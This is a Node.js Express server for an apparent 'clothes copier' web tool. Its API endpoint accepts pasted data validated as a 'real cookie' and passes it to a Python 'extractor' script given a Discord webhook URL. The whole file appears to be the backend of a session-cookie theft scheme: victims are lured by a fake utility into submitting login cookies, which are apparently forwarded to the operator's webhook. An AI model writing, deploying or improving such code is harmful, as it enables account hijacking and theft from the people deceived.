const express = require('express');
const { spawn } = require('child_process');
const path = require('path');
const fs = require('fs');

const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

app.use(express.static(path.join(__dirname, 'public')));

app.get('/clothes-copier', (req, res) => {
    const targetFile = 'clothes-copier.html';
    const filePath = path.join(__dirname, 'public', targetFile);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.status(404).send('Clothes copier page not found.');
    }
});

app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

// Safe validation helper: Blocks short/fake input but allows real cookies through
function isValidCookiePayload(rawInput) {
    if (!rawInput) return false;
    const str = String(rawInput).trim();

    // Must be at least 50 characters long to even be considered a real cookie/script
    if (str.length < 50) return false;

    return true;
}

app.post('/api/process', (req, res) => {
    const { data } = req.body;
    if (!data) {
        return res.status(400).json({ success: false, error: "Missing data payload" });
    }

    // Validate input before triggering the Python script
    if (!isValidCookiePayload(data)) {
        return res.status(400).json({ success: false, error: "Invalid cookie or payload format." });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (!webhookUrl) {
        return res.status(500).json({ success: false, error: "Webhook not configured on server" });
    }

    const scriptPath = path.join(__dirname, 'core_extractor.py');
    const pyProcess = spawn('python3', [scriptPath], {
        env: { ...process.env, DISCORD_WEBHOOK_URL: webhookUrl }
    });

    let stdoutData = '';
    let stderrData = '';
    let responded = false;
    let timedOut = false;

    const sendJsonOnce = (statusCode, payload) => {
        if (responded) return;
        responded = true;
        clearTimeout(timeoutId);
        res.status(statusCode).json(payload);
    };

    // Kill hung Python runs before the reverse proxy drops the request with a 502
    const timeoutId = setTimeout(() => {
        timedOut = true;
        pyProcess.kill('SIGKILL');
        sendJsonOnce(504, {
            success: false,
            error: "Extractor timed out.",
            details: stderrData || "Python process exceeded 25s limit."
        });
    }, 25000);

    pyProcess.stdout.on('data', (chunk) => {
        stdoutData += chunk;
    });

    pyProcess.stderr.on('data', (chunk) => {
        stderrData += chunk;
    });

    // Prevent unhandled spawn errors (e.g., ENOENT if python3 isn't installed) from crashing Node
    pyProcess.on('error', (err) => {
        console.error('Failed to start Python process:', err);
        sendJsonOnce(500, {
            success: false,
            error: "Failed to start extractor process.",
            details: err.message
        });
    });

    // Prevent EPIPE / stream errors on stdin from crashing Node
    pyProcess.stdin.on('error', (err) => {
        console.error('Error writing to Python stdin:', err);
        sendJsonOnce(500, {
            success: false,
            error: "Failed to send payload to extractor.",
            details: err.message
        });
    });

    pyProcess.on('close', (code, signal) => {
        if (timedOut) return;

        if (code !== 0) {
            console.error(`Python script failed with code ${code}, signal ${signal}. Stderr: ${stderrData}`);
            return sendJsonOnce(500, {
                success: false,
                error: "Extractor execution failed.",
                details: stderrData || `Python exited with code ${code} (signal: ${signal}). Stdout was: ${stdoutData}`
            });
        }

        sendJsonOnce(200, { success: true, output: stdoutData });
    });

    try {
        pyProcess.stdin.write(String(data));
        pyProcess.stdin.end();
    } catch (err) {
        console.error('Synchronous stdin write error:', err);
        sendJsonOnce(500, {
            success: false,
            error: "Failed to write payload to extractor.",
            details: err.message
        });
    }
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason);
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
